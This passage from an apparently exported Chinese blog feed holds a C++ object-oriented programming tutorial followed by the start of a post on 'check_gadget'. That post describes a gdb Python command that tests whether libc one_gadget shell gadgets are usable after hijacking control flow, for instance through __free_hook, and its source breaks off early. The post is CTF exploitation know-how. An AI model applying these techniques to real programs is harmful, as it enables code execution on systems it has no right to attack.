中的所有属性和方法，被称之为多继承。字面意思就是其作用，指一个类可以同时继承多个类的特征。</p><p>代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *color;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_color</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *col)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">color=col;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_color</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;color is &quot;</span> &lt;&lt; color &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box,<span class="keyword">public</span> obj</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hight;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hight=hei;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BBox box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">box.<span class="built_in">output_length</span>();</span><br><span class="line">box.<span class="built_in">output_hight</span>();</span><br><span class="line">box.<span class="built_in">set_color</span>(<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">box.<span class="built_in">output_color</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052000403.png" alt="image-20230105200054215"></p><p>可以看到 <code>BBox</code> 同时继承了 <code>Box</code> 和 <code>obj</code> 两个类的属性和方法，并且成功调用。这个多继承理解起来应该蛮简单的，<strong>值得一提的是构造函数和析构函数不可以被继承</strong>。</p><h3 id="多态">多态</h3><p>多态是针对具体某个函数而言的，称之为多态性。在 C++ 中，一个函数要想具有多态性，必须同时满足以下两个条件：</p><ol><li>函数是从基类继承而来的，即基类中定义了这个函数，而派生类中又重新定义了这个函数。</li><li>函数为动态绑定，这意味着函数的调用版本是在运行时确定的。在 C++ 中，可以使用虚函数来实现动态绑定。</li></ol><p>第一个条件很好理解，就是我在基类 <code>A</code> 中定义了函数 <code>print</code> ，在它的派生类 <code>B</code> 中我对继承来的函数 <code>print</code> 进行了重写。</p><h4 id="静态绑定">静态绑定</h4><p>将第二个条件就要提到 C++ 里的静态绑定和动态绑定的概念，静态绑定指的是在编译时就已经可以确定调用的函数版本（也就是确定调用的这个函数属于哪个类中的），这样即使派生类重写了函数，也不会体现出多态的效果，静态绑定可以使程序执行的更快，因为编译器可以在编译时确定函数的调用版本，而不需要在运行时调用。</p><p>如下代码， <code>print</code> 函数就为静态绑定</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">print</span>();  <span class="comment">// 静态绑定：B::print</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="动态绑定">动态绑定</h4><p>动态绑定是函数在调用时确定的具体版本（也就是哪个类中的函数），而非在编译时就确定了。</p><p>这是通过指针来调用函数实现的，比如我定义了一个基类 <code>A</code> 的指针为 <code>a</code> ，然后申请了它的派生类 <code>B</code> 大小的空间，将指针 <code>a</code> 指向了申请 <code>B</code> 类的对象地址。这个写成代码应该为 <code>A* a = new B() </code> 。这里其实是我实例化了一个 <code>B</code> 类的对象，然后让指针 <code>a</code> 指向了这个对象的地址，这里之所以 <code>B</code> 后面带 <code>()</code>，是表示调用了 <code>B</code> 类的构造函数来创建 <code>B</code> 类对象。</p><p>而上述的情况就会导致，我可以给 <code>a</code> 指针任意赋值其他对象，因为 <code>a</code> 的指针类型为基类,所以我可以随意指向它的派生类，这就导致了我在编译的时候不能确定这个指针到底调用的哪个类中的方法。因此只能等到运行时确定，这就是所谓的动态绑定。</p><p>动态绑定的代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    a = <span class="keyword">new</span> <span class="built_in">C</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 C::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052225623.png" alt=""></p><p><strong>注意</strong>：动态绑定的前提是基类中的函数被 <code>virtual</code> 关键词声明为虚函数才行，如果上述代码将基类中的 <code>virtual</code> 关键词去掉，那么输出结果就为两个 <code>A::print</code> 。因为编译器在处理的时候发现没有 <code>virtual</code> 就不会认为这是虚函数，<strong>从而你使用基类的指针即使调用派生类中的函数依然调用的是基类中的函数，依然不会去考虑指针所指向的对象的实际类型</strong>。</p><h4 id="虚函数-虚函数表-虚表指针">虚函数&amp;&amp;虚函数表&amp;&amp;虚表指针</h4><p>上面的那段文字中出现了虚函数这个陌生的概念，这里来讲一下动态绑定是如何被实现的。</p><p>接下来将提到三个概念，分别是虚函数，虚函数表和虚表指针。</p><p>简单解释一下，虚函数表其实就是一个<strong>函数指针数组</strong>（就是存放虚函数指针的一个数组），虚表指针则是指向虚函数表的一个<strong>指针</strong>，虚函数则是被 <code>virtual</code> 关键字声明的函数。</p><p>我们考虑一下这个动态绑定，它是一个基类的指针，可以去指向派生类实例后的对象，从而去调用派生类中的函数，并且指向不同的派生类的对象，可以调用同一个函数名但作用不同的函数（这个就是函数的多态性）。具体实现过程如下：</p><p>首先在基类A中定义了虚函数，那么这个类A就会拥有一个虚函数表，这个表中会存放基类A中所有的虚函数地址（不是虚函数的话，就不会将地址放到这个虚函数表中）</p><p>方便理解，画了个示意图</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052306391.png" alt="image-20230105230622294" style="zoom:50%;" /><p>然后基类A实例化了一个对象，名为 <code>a</code> ，那么这个对象内部将包含一个虚表指针 <code>*__vptr</code>（这是编译器进行添加的），这个虚表指针就指向了自己这个类的虚函数表。</p><p>下面两个图分别是有虚函数和没有虚函数的类，可以看见他们的大小差了八个字节，刚好是64位程序里一个指针的大小，而这个指针就是编译器自动添加的虚表指针。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052313274.png" alt="image-20230105231306685"></p><p><strong>基类中如果存在虚函数表的话，那么派生类则会将虚函数表也继承下来</strong>，如果<u>派生类中没有对基类中的函数进行重新定义，那么虚函数中的函数指针不变，如果派生类对某个基类中的函数进行了重新定义，那么虚函数表中的函数指针将被更新为新的虚函数地址。同样的，派生类实例化后的对象也具有一个虚表指针，来指向派生类自己的虚函数表</u>。</p><p>以下面的代码为例，具体说明一下动态绑定的实现过程</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先， <code>A* a = new B()</code> 定义了一个类A的指针a（事实上接下来要说的和指针类型没有关系，即使这里是类B指针也完全可以），然后将B类实例化为对象的地址赋值给了 <code>a</code>，所以当前 <code>a</code> 可以通过对象中自己存储的一个 <code>vptr</code> 指针来访问到类B的虚函数表，从而去类B的虚函数中找到 <code>print</code>的函数指针并调用，最终输出 <code>B::print</code> 。</p><p><strong>注意：虽然上述操作和 <code>a</code> 指针的类型无关，但是不可以定义为类C的指针（也就是说这个指针的类型要么是基类，要么是当前这个派生类），因为这样会得到一个编译错误。</strong></p><h3 id="纯虚函数-抽象类">纯虚函数&amp;&amp;抽象类</h3><p>纯虚函数是一种<strong>虚函数</strong>，它没有实际实现，<strong>只有对函数的声明</strong>。纯虚函数是通过在<strong>函数声明的末尾添加一个 <code>=0</code> 来定义的</strong>，<strong>纯虚函数的目的就是要让基类的派生类去实现它</strong>。</p><p>纯虚函数的定义如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果单纯的看纯虚函数，感觉这样做似乎没有什么意义。但事实上纯虚函数是为抽象类来服务的，如果一个类中包含了纯虚函数，那么这个类就是抽象类，<strong>抽象类无法被创建对象，它的作用是为其他类提供一个基类</strong>，假如有一个抽象类 <code>Animal</code> ，它定义了一个纯虚函数 <code>makeSound</code> ，之后我们可以创建比如 <code>cat</code> <code>dog</code> 这样的派生类，这样我去每个具体的派生类里面来实现 <code>makeSound</code>。你可以将抽象类理解为某些事物必有的一些特性，而具体的特性又会根据事物的不同而要重新定义，就比如刚刚提到的 <code>makeSound</code> ，在动物中一定都可以发出声音，但是每个动物发出的声音都不一样，因此我们先定义一个抽象类，至于每个动物发出的声音在具体的派生类中再去实现。</p><p>下面写一个抽象类与纯虚函数的代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Wang&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;miao&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Animal *p=<span class="keyword">new</span> <span class="built_in">dog</span>();</span><br><span class="line">p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">p=<span class="keyword">new</span> <span class="built_in">cat</span>();</span><br><span class="line">p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061628111.png" alt="image-20230106162845748"></p><h3 id="this指针">this指针</h3><p><code>this</code> 指针是类中成员函数的一个隐含参数，每个对象都可以通过 <code>this</code> 指针来访问自己的地址。</p><p>这个主要一个用处是可以区分类中的成员和函数局部变量，假如有如下代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_x</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_x</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;x is &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A a;</span><br><span class="line">a.<span class="built_in">set_x</span>(<span class="number">60</span>);</span><br><span class="line">a.<span class="built_in">output_x</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，我们的本意是希望赋值给类中的成员 <code>x</code> ，但是在 <code>set_x</code> 函数中x进行赋值的时候，程序认为是赋值给函数中的局部变量 <code>x</code> 。所以去输出成员变量 <code>x</code> 的时候就发生了错误，如下运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061748632.png" alt="image-20230106174845468"></p><p>因此这里我们想强调赋值的是给类中的成员变量 <code>x</code>，就可以写成 <code>this-&gt;x</code>，此时的运行结果就会正常（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061752361.png" alt="image-20230106175223292"></p><p><strong>注意：只有在类的成员函数内部才能使用 <code>this</code> ，在其他函数中使用 <code>this</code> 是无效的</strong></p><h3 id="友元函数">友元函数</h3><p>上面提到，如果某个成员变量用 <code>private</code> 进行了修饰，那么就得通过类中定义的公有函数来进行访问，但是有这样一种特殊的函数，<strong>它在类中声明</strong>，具体的定义在类的外面，最关键的是它拥有访问私有（ <code>pritvate</code> ）成员和受保护（<code>protected</code>）成员的特性。这样的函数就叫做<strong>友元函数</strong></p><p>代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_price</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;price is &quot;</span> &lt;&lt; price &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">a.price=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A a;</span><br><span class="line"><span class="built_in">set_price</span>(a,<span class="number">30</span>);<span class="comment">//不需要声明a对象调用了set_price函数</span></span><br><span class="line">a.<span class="built_in">output_price</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061935757.png" alt="image-20230106193519661"></p><p>可以看见上面的代码中，我并没有在定义的部分写成 <code>A::set_price(A&amp; a,int n)</code>，但依然可以访问到类 <code>A</code> 中的属性。但要注意的是， <code>set_price</code> 函数传参的时候，要提供对象 <code>a</code> 的引用，如果这里仅仅是传递进去了对象 <code>a</code> 那么修改的只是 <code>a</code> 的副本，并没有对原本的实例造成任何改变（函数的参数如果直接传递的是对象，那么仅仅是拷贝一个副本进去）。</p><p>关于友元函数有几点需要注意：</p><ol><li>友元函数不是类的成员函数，因此不能使用类的示例成员访问符 <code>.</code> 或成员指针运算符 <code>-&gt;</code> 来调用友元函数，同样因为这个原因，友元函数也没有 <code>this</code> 指针。</li><li>友元函数的声明只能出现在类的定义中，而不能出现在类的实现中。</li><li>友元函数可以访问类的所有成员，包括私有成员和公有成员以及受保护成员，因此友元函数不受类的访问控制的限制。</li></ol><h3 id="参考文章">参考文章</h3><p><a href="https://blog.csdn.net/hengyunabc/article/details/7773449">https://blog.csdn.net/hengyunabc/article/details/7773449</a></p><p><a href="https://blog.csdn.net/marvie_xie/article/details/79042654">(44条消息) C++学习笔记一：cout如何判断输入数据类型_marvie_xie的博客-CSDN博客_c++判断输入数据类型</a></p><p><a href="https://www.runoob.com/cplusplus/cpp-overloading.html">C++ 重载运算符和重载函数 | 菜鸟教程 (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>check_gadget--检测one_gadget能否使用的gdb命令</title>
      <link href="/posts/bd34f701.html"/>
      <url>/posts/bd34f701.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>作为一个 <code>pwner</code> ，对 <code>one_gadget</code> 肯定不会陌生，如果在能劫持执行流的前提下， <code>one_gadget</code> 在劫持执行流的位置也恰巧能用，那就可以在一定程度上简化获取 <code>shell</code> 的操作，因为执行 <code>system(&quot;/bin/sh\x00&quot;)</code> 是需要控制参数的，有些情况下劫持执行流容易但可能控制参数还得再废些力气，此时成功打一发 <code>one_gadget</code> 可以说是方便又迅速。</p><p>但因为 <code>one_gadget</code> 条件的限制， <code>one_gadget</code> 成功的概率并不高，通常是一个一个试，或者调试到劫持执行流的位置观察一下寄存器和内存的情况进行判断。很早之前我就有这样一个想法，如果能用 <code>gdb</code> 调试到劫持的地址处，输入一个命令直接判断所有的 <code>one_gadget</code> 能否生效该有多方便。终于在几天前进行了动手实践，并将其写出来。</p><p><code>check_gadget</code> 是一个 <code>gdb</code> 命令，该命令我是用 <code>python</code> 进行编写的 这篇 <a href="https://zikh26.github.io/posts/26ba4673.html">文章</a> 记录了如何用 <code>python</code> 来自定义命令。</p><h2 id="使用效果">使用效果</h2><p>此处控制了 <code>__free_hook</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081628082.png" alt="image-20230208162838925" style="zoom:50%;" /><p>然后我们 <code>si</code> 进去，使用 <code>check_gadget</code> 命令，发现了一个可用的 <code>one_gadget</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081627797.png" alt="image-20230208162716225" style="zoom: 50%;" /><p>该命令是判断当前位置的 <code>one_gadget</code> 能否生效,所以这个命令在哪里都可以使用，但真正用到 <code>one_gadget</code> 的地方应该是我们控制执行流的地址。</p><p>即使在对 <code>32</code> 位的程序的判断中，该命令依然发挥出色</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081633584.png" alt="image-20230208163319420"></p><h2 id="缺点">缺点</h2><p>这个命令本身是依赖 <code>one_gadget</code> 的返回条件进行判断的，但有时候 <code>one_gadget</code> 给出的条件虽然不满足但也能获取 <code>shell</code> （如下），而 <code>check_gadget</code> 命令无法检测出来这种情况。</p><p>下图是跳转到了一个 <code>one_gadget</code> 中，并没有满足 <code>one_gadget</code> 的条件，但依然可以获取 <code>shell</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081609202.png" alt="image-20230208160957660" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081611903.png" alt="image-20230208161106805" style="zoom:50%;" /><h2 id="设计思路">设计思路</h2><p>判断 <code>one_gadget</code> 的大致想法无非就两个，第一个是直接改变 <code>rip</code> 跑一遍 <code>one_gadget</code> （ <strong>winmt</strong> 师傅给我的提示是在当前要测试 <code>one_gadget</code> 的位置直接开多个子进程然后分别改变 <code>rip</code> 为不同的 <code>one_gadget</code> 以便测试所有的 <code>one_gadget</code> ），第二个思路就是我的这种，去将 <code>one_gadget</code> 的条件提取出来，访问寄存器和内存的值，来检查条件是否成立。</p><p>其实第一种思路我认为才是最优解，主要是 <strong>winmt</strong> 师傅给我说这种思路的时候我已经把命令写完了 QAQ ,因为第二种思路有上面所提到的缺陷。</p><p>下面说一下我这个命令的整体实现思路</p><ol><li>首先去获取 <code>one_gadget</code> 的所有信息，并进行逐一分组</li><li>逐一判断每个 <code>one_gadget</code> 中的条件，利用正则表达式和 <code>if</code> 判断识别其特征，并调用相应的处理函数</li><li>获取其关键信息，比如 <code>[rsp+0x40] == NULL</code> 这个条件,就需要先识别出来外面有一组 <code>[]</code> ，然后还需要提取出来 <code>rsp</code> <code>+</code> <code>0x40</code> 这三个关键信息，利用 <code>gdb</code> 模块中的一些函数来访问寄存器和内存的值，进行处理后来判断等式是否成立</li><li>最后将一组命令的返回值都存储到一个列表中，只需要遍历返回值列表就知道哪组 <code>one_gadget</code> 可以使用或者不能使用</li></ol><h2 id="如何使用">如何使用</h2><p>首先需要确定你的 <code>gdb</code> 版本要比较新，至少我在老掉牙的 <code>ubuntu18.04</code> 中，<code>gdb</code> 版本为 <code>8.1.1</code> 是没法用的。我使用这个命令的环境是 <code>ubuntu 22.04</code> <code>gdb</code> 版本为 <code>12.0.90</code></p><p>然后创建一个 <code>command.py</code> 文件（名字随意，位置也随意），将下面的源代码复制进去</p><p>然后在 <code>.gdbinit</code> 文件中引入这个 <code>command.py</code> 文件即可（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081641185.png" alt="image-20230208164134100"></p><p>然后启动 <code>gdb</code> 调试，就可以使用该命令了</p><h2 id="源代码">源代码</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a,b=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_path</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">        string=line.split()[-<span class="number">1</span>]</span><br><span class="line">        string = string[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadget_info</span>(<span class="params">library</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是获取当前 libc 的 one_gadget信息 -l2除外</span></span><br><span class="line"><span class="string">    将每一组的 one_gadget 信息（地址和条件）放到一个元组里面，作为返回列表的一个元素</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    library(str): 当前程序所依赖的 libc 库路径</span></span><br><span class="line"><span class="string"></span></span><br><span 